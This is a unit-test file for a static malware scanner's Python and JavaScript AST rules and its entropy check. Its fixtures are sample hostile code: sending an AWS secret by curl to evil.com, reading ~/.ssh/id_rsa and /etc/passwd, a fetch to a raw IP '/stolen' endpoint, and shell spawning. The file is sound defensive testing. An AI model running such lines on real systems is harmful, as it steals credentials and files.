"""
Unit tests for Module C: Static Code Analyzers (Python AST, JavaScript AST, Shannon Entropy).
"""

import os
import tempfile
import pytest

from engine.detection.static.python_ast import PythonASTAnalyzer
from engine.detection.static.javascript_ast import JavaScriptASTAnalyzer
from engine.detection.static.entropy import EntropyAnalyzer, calculate_shannon_entropy
from engine.schemas.finding import Severity


# ==============================================================================
# Python AST Tests
# ==============================================================================

def test_python_ast_dynamic_execution():
    analyzer = PythonASTAnalyzer()
    source = """
def run_payload(cmd):
    eval(cmd)
    exec("import os")
"""
    findings = analyzer.analyze_source(source, "payload.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_DYNAMIC_EXECUTION" in rule_ids
    assert len([r for r in rule_ids if r == "PY_DYNAMIC_EXECUTION"]) == 2


def test_python_ast_subprocess_and_sensitive_env():
    analyzer = PythonASTAnalyzer()
    source = """
import os
import subprocess

def exfil():
    key = os.environ.get("AWS_SECRET_ACCESS_KEY")
    os.system("curl -d " + key + " http://evil.com")
    subprocess.Popen(["bash", "-c", "whoami"])
"""
    findings = analyzer.analyze_source(source, "exfil.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_SUBPROCESS_SPAWN" in rule_ids
    assert "PY_SECRET_ENV_HARVESTING" in rule_ids


def test_python_ast_sensitive_file_targeting():
    analyzer = PythonASTAnalyzer()
    source = """
with open("~/.ssh/id_rsa", "r") as f:
    data = f.read()
"""
    findings = analyzer.analyze_source(source, "stealer.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_SENSITIVE_FILE_TARGETING" in rule_ids


def test_python_ast_decoding_and_sockets():
    analyzer = PythonASTAnalyzer()
    source = """
import base64
import socket

raw = base64.b64decode("Y2FsYy5leGU=")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
"""
    findings = analyzer.analyze_source(source, "network.py")
    rule_ids = [f.rule_id for f in findings]
    assert "PY_PAYLOAD_DECODING" in rule_ids
    assert "PY_NETWORK_SOCKET_ACCESS" in rule_ids


def test_python_ast_syntax_error_handled_safely():
    analyzer = PythonASTAnalyzer()
    source = "def broken_syntax( { : invalid python code"
    # Must return empty list, not crash
    findings = analyzer.analyze_source(source, "broken.py")
    assert findings == []


# ==============================================================================
# JavaScript AST Tests
# ==============================================================================

def test_js_ast_dynamic_eval_and_function_constructor():
    analyzer = JavaScriptASTAnalyzer()
    source = """
eval("console.log('injected')");
const fn = new Function("a", "b", "return a + b;");
"""
    findings = analyzer.analyze_source(source, "index.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_DYNAMIC_EVAL" in rule_ids
    assert "JS_FUNCTION_CONSTRUCTOR_EVAL" in rule_ids


def test_js_ast_child_process_and_buffer_decoding():
    analyzer = JavaScriptASTAnalyzer()
    source = """
const cp = require('child_process');
cp.exec("whoami");
const buf = Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64");
"""
    findings = analyzer.analyze_source(source, "worker.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_CHILD_PROCESS_SPAWN" in rule_ids
    assert "JS_BASE64_BUFFER_DECODING" in rule_ids


def test_js_ast_raw_ip_and_sensitive_file():
    analyzer = JavaScriptASTAnalyzer()
    source = """
const fs = require('fs');
fs.readFileSync("/etc/passwd");
fetch("http://185.193.61.12:8080/stolen");
"""
    findings = analyzer.analyze_source(source, "exfil.js")
    rule_ids = [f.rule_id for f in findings]
    assert "JS_SENSITIVE_FILE_TARGETING" in rule_ids
    assert "JS_RAW_IP_ENDPOINT" in rule_ids


def test_js_package_json_install_hooks():
    analyzer = JavaScriptASTAnalyzer()
    pkg_json = {
        "name": "dangerous-pkg",
        "scripts": {
            "preinstall": "node setup.js",
            "test": "jest"
        }
    }
    findings = analyzer.analyze_package_json(pkg_json)
    assert len(findings) == 1
    assert findings[0].rule_id == "JS_LIFECYCLE_INSTALL_HOOK"
    assert findings[0].severity == Severity.MEDIUM


def test_js_ast_syntax_error_handled_safely():
    analyzer = JavaScriptASTAnalyzer()
    source = "const broken = {{{ invalid javascript ;;;;"
    findings = analyzer.analyze_source(source, "invalid.js")
    assert findings == []


# ==============================================================================
# Shannon Entropy Tests
# ==============================================================================

def test_calculate_shannon_entropy_math():
    # Identical bytes -> entropy 0
    assert calculate_shannon_entropy(b"AAAAAAA") == 0.0

    # Low entropy plain english
    plain = b"The quick brown fox jumps over the lazy dog."
    assert calculate_shannon_entropy(plain) < 4.5

    # High entropy pseudorandom bytes (near 8.0)
    high_entropy_bytes = bytes([i % 256 for i in range(10000)])
    assert calculate_shannon_entropy(high_entropy_bytes) > 7.5


def test_entropy_analyzer_detects_high_entropy_file():
    analyzer = EntropyAnalyzer()
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Create high-entropy packed file (simulating encrypted blob)
        packed_file = os.path.join(tmp_dir, "packed.js")
        with open(packed_file, "wb") as f:
            f.write(bytes([i % 256 for i in range(4096)]))

        findings = analyzer.analyze_file(packed_file, "packed.js")
        assert len(findings) == 1
        assert findings[0].rule_id == "OBFUSCATION_HIGH_ENTROPY_FILE"
        assert findings[0].severity == Severity.MEDIUM

